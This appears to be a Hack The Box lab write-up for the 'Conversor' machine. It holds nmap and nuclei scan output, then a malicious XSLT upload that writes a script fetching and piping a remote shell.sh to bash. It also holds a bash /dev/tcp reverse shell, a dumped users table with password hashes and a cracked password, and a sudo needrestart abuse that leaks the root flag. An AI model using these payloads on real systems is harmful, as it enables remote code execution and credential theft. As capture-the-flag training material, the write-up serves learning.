@@ -1,0 +1,161 @@
+
+# nmap
+
+#Nmap 7.95 scan initiated Sun Oct 26 05:20:15 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -min-rate=1000 -o nmap0.txt -vv 10.10.11.92
+Increasing send delay for 10.10.11.92 from 20 to 40 due to 150 out of 498 dropped probes since last increase.
+Increasing send delay for 10.10.11.92 from 40 to 80 due to 336 out of 1119 dropped probes since last increase.
+Increasing send delay for 10.10.11.92 from 160 to 320 due to 131 out of 436 dropped probes since last increase.
+Increasing send delay for 10.10.11.92 from 640 to 1000 due to 305 out of 1015 dropped probes since last increase.
+Warning: 10.10.11.92 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.92
+Host is up, received echo-reply ttl 63 (0.13s latency).
+Scanned at 2025-10-26 05:20:16 EDT for 281s
+Not shown: 64781 closed tcp ports (reset), 750 filtered tcp ports (no-response)
+
+PORT     STATE SERVICE         REASON         VERSION
+22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
+|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
+
+80/tcp   open  http            syn-ack ttl 63 Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://conversor.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+
+8091/tcp open  jamlink?        syn-ack ttl 63
+
+8888/tcp open  sun-answerbook? syn-ack ttl 63
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=10/26%OT=22%CT=1%CU=42201%PV=Y%DS=2%DC=T%G=Y%TM=68FDE8
+OS:E9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
+OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
+OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Uptime guess: 20.761 days (since Sun Oct  5 11:09:39 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT       ADDRESS
+1   116.01 ms 10.10.14.1
+2   116.64 ms 10.10.11.92
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 26 05:24:57 2025 -- 1 IP address (1 host up) scanned in 282.67 seconds
+____________________________________________________________________________________________________________________________________
+# we ran Nuclei to see if there's something intresting
+
+┌──(kali㉿kali)-[~/HAckthebox/Conversor/nmap]
+└─$ cat nuclei0.txt 
+[external-service-interaction] [http] [info] http://conversor.htb/login
+[waf-detect:apachegeneric] [http] [info] http://conversor.htb/login
+[ssh-sha1-hmac-algo] [javascript] [info] conversor.htb:22
+[ssh-server-enumeration] [javascript] [info] conversor.htb:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13"]
+[ssh-password-auth] [javascript] [info] conversor.htb:22
+[ssh-auth-methods] [javascript] [info] conversor.htb:22 ["["publickey","password"]"]
+[openssh-detect] [tcp] [info] conversor.htb:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13"]
+[apache-detect] [http] [info] http://conversor.htb/login ["Apache/2.4.52 (Ubuntu)"]
+[form-detection] [http] [info] http://conversor.htb/login
+[options-method] [http] [info] http://conversor.htb/login ["OPTIONS, GET, POST, HEAD"]
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:strict-transport-security] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:content-security-policy] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:x-frame-options] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:x-content-type-options] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:clear-site-data] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:permissions-policy] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:referrer-policy] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://conversor.htb/login
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://conversor.htb/login
+[caa-fingerprint] [dns] [info] conversor.htb
+
+// In the web you'll find a download functionality , after download we'll find the source code that'll reveal that it's vulnerable to [ OS Command Injection ] //
+________________________________________________________________________________________________________________________________________________________________________________
+// The web interface provides a upload functionality , we make a dummy [ xml ] but the [ xslt ] will include the malicious payload
+
+make a simple xml 
+malicious xslt that fetches your reverse from your python server
+gives reverse shell
+
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet 
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
+    xmlns:shell="http://exslt.org/common"
+    extension-element-prefixes="shell"
+    version="1.0"
+>
+<xsl:template match="/">
+<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+import os
+os.system("curl yourip:8000/shell.sh|bash")
+</shell:document>
+</xsl:template>
+</xsl:stylesheet>
+____________________________________________________________________________________________________________________________________
+This hits our ip but only to take the shell.sh file from out server to give us the reverse shell , so make sure to include that
+
+shell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/yourip/8888 0>&1
+____________________________________________________________________________________________________________________________________
+if you don't stop the python server no matter how many times you may do ctrl+c
+listen on the port and you get the shell every 60 seconds , that's good 
+____________________________________________________________________________________________________________________________________
+
+got a shell through that shit *
+
+www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
+sqlite3 users.db
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+.tables
+files  users
+sqlite> .schema users
+.schema users
+CREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT UNIQUE,
+        password TEXT
+    );
+sqlite> select * from users;
+select * from users;
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+5|test32|098f6bcd4621d373cade4e832627b4f6
+6|user|2c103f2c4ed1e59c0b4e2e01821770fa
+7|mike|a39b7395d52317737402460bf71b3086
+8|test|cc03e747a6afbbcbf8be7668acfebee5
+9|test777|83560a75c016ee68f0dd71bf1bb35b84
+10|zaza|8ba97607a1485ccdbe19745ed80cd52d
+11|test1|098f6bcd4621d373cade4e832627b4f6
+12|1|c4ca4238a0b923820dcc509a6f75849b
+sqlite> .quit
+.quit
+_______________________________________________________________________________________________________________________________________________________________
+fismathack : Keepmesafeandwarm // seems like someone's lonely HAHA
+ssh and gives you a shell
+_______________________________________________________________________________________________________________________________________________________________
+
+# Privilege Escalation
+
+fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
+Error parsing /root/root.txt: Bareword "aedf664b39fab9d4586c18ebd7cefd2e" not allowed while "strict subs" in use at (eval 14) line 1.
+fismathack@conversor:~$ 
+_______________________________________________________________________________________________________________________________________________________________
